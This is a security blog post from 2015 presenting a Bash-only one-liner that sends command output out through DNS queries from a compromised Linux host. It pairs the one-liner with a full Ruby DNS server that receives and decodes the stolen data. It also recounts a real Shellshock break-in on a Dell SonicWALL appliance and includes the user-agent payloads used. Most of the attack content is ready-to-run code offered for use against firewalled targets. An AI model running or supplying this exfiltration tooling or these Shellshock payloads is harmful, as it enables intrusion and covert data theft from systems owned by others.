---
id: 260
title: Bash data exfiltration through DNS (using bash builtin functions)
date: 2015-01-19T20:25:47+01:00
author: wesley
layout: post
permalink: /2015/01/bash-data-exfiltration-through-dns-using-bash-builtin-functions/
---
After gaining &#8216;blind&#8217; command execution access to a compromised Linux host, data exfiltration can be difficult when the system i<img style="float: right;"  src="https://forsec.nl/wp-content/uploads/2015/01/binbash2.png" alt="binbash2" width="261" height="77" />s protected by a firewall. Sometimes these firewalls prevent the compromised host to establish connections to the internet. In these cases, data exfiltration through the DNS-protocol can be useful. In a lot of cases DNS-queries are not blocked by a firewall.  I&#8217;ve had a real life situation like this, which i will describe later on.

There are several oneliners on the internet available to exfiltrate command output through DNS. However, i noticed that these are using Linux applications (xxd, od, hexdump, etc), which are not always present on a minimalistic target system. I decided to create a oneliner, which is only using Bash builtin functionalities. The oneliner can be used whenever command execution is possible and Bash is installed on the compromised system.

<!--more-->

I&#8217;ve created the following bash command line which can be used on the attacked system to execute commands and send the results through DNS:

{% highlight bash%}
(LINE=`id`;domain=yourdomain.com;var=;while IFS= read -r -n 1 char;do var+=$(printf %02X "'${char:-$'\n'}'");done<<<$LINE;e=60;l=${#var};for((b=0;b<l;b+=60))do>&/dev/udp/$RANDOM.$b.${var:$b:$e}.$domain/53 0>&1;done;>&/dev/udp/$RANDOM.theend.$domain/53 0>&1)
{% endhighlight %}

<p class="p1">
  In order to use it, first modify the name servers of your domain, point them to the ip-address of the attacker machine. Also two values in the above oneliner need to be changed. The variable &#8220;LINE&#8221; needs to contain the command to execute, for example &#8220;ls -l /&#8221;. Also the variable &#8220;domain&#8221; needs to be modified, replace it with the domain which is pointed to your attacker machine. On the attacker machine, the following server side ruby script (dns.rb) can be started:
  {% highlight ruby %}
#!/usr/bin/ruby

require 'socket'

class UDPServer
  def initialize(port)
    @port = port
  end

  def start
    farray = []
    oarray = []
    @socket = UDPSocket.new
    @socket.bind('', @port)
    cmd = true
    while true
      data , soc = @socket.recvfrom(1024)
      idx = 12
      len = data[idx].ord
      domain = ""
      until len == 0 do
        domain += data[idx + 1, len] + "."
        idx += len + 1
        len = data[idx].ord
      end
      @socket.send(response(data), 0, soc[3], soc[1])
      farray << domain
      if domain.split(".")[-3] == "theend"
          farray.uniq!
          farray.pop
          for i in farray
              oarray << i.split(".")[-3]
          end
          comp = oarray.join()
          output = comp.gsub(/../) { |pair| pair.hex.chr }
          puts output
          farray = []
          oarray = []
      end
    end
  end

  def response(data)
    response = "#{data[0,2]}\x81\x00#{data[4,2] * 2}\x00\x00\x00\x00"
    response += data[12..-1]
    response += "\xc0\x0c\x00\x01\x00\x01"
    response += [60].pack("N")
    rdata = "1.1.1.1".split('.').collect(&:to_i).pack("C*")
    response += [rdata.length].pack("n")
    response += rdata
  end
end

server = UDPServer.new(53)
server.start
{% endhighlight %}
</p>

The script will retrieve the output of the executed command. The following screenshot shows the command executed on a targeted system:

[<img class="alignnone size-full wp-image-311" src="https://forsec.nl/wp-content/uploads/2015/01/dns_client3.png" alt="dns_client3" width="804" height="52" />](https://forsec.nl/wp-content/uploads/2015/01/dns_client3.png)

This screenshot shows the retrieved data by the attacker, using the dns.rb script:

[<img class="alignnone size-full wp-image-276" src="https://forsec.nl/wp-content/uploads/2015/01/dns_server.png" alt="dns_server" width="1138" height="114" />](https://forsec.nl/wp-content/uploads/2015/01/dns_server.png)

There might be improvements possible to the oneliner and script to make it more efficient. Or there might be some cases where the oneliner doesn&#8217;t work. Do not hesitate to comment on this blog if you have an improvement.

**Real life scenario**

I stumbled on a Dell SonicWALL Secure Remote Access (SRA) appliance which was vulnerable to Shellshock. I discovered this by sending the following user-agent, which returned a 200 HTTP response.

<pre>User-agent: () { :; }; /bin/ls</pre>

[<img class="alignnone size-full wp-image-287" src="https://forsec.nl/wp-content/uploads/2015/01/sslvpn_200.png" alt="sslvpn_200" width="965" height="189" />](https://forsec.nl/wp-content/uploads/2015/01/sslvpn_200.png)

When sending a user-agent with a non-existing binary, it returned a 500 HTTP response, which indicates something went wrong (it cannot execute the defined binary):

<pre>User-agent () { :;}; /bin/fake</pre>

[<img class="alignnone size-full wp-image-288" src="https://forsec.nl/wp-content/uploads/2015/01/sslvpn_500.png" alt="sslvpn_500" width="930" height="181" />](https://forsec.nl/wp-content/uploads/2015/01/sslvpn_500.png)

I was able to execute commands using the Shellshock vulnerability (confirmed by running /bin/sleep 60), however it was not responding with the command output on commands like &#8216;ls&#8217;. I discovered that all outgoing connections to the internet were blocked by the machine, only the DNS protocol was allowed, by resolving a hostname using the telnet executable. The appliance did not have any executables like xxd, hexdump etc. Therefor i decided to create the above line, which is not depending on these utilities, so can be used on any system containing Bash.

Dell is already aware of the Shellshock vulnerability in the older firmware versions of SRA. More details on how to patch the issue can be found at:

<a href="https://support.software.dell.com/product-notification/133206?productName=SonicWALL%20SRA%20Series">https://support.software.dell.com/product-notification/133206?productName=SonicWALL%20SRA%20Series</a>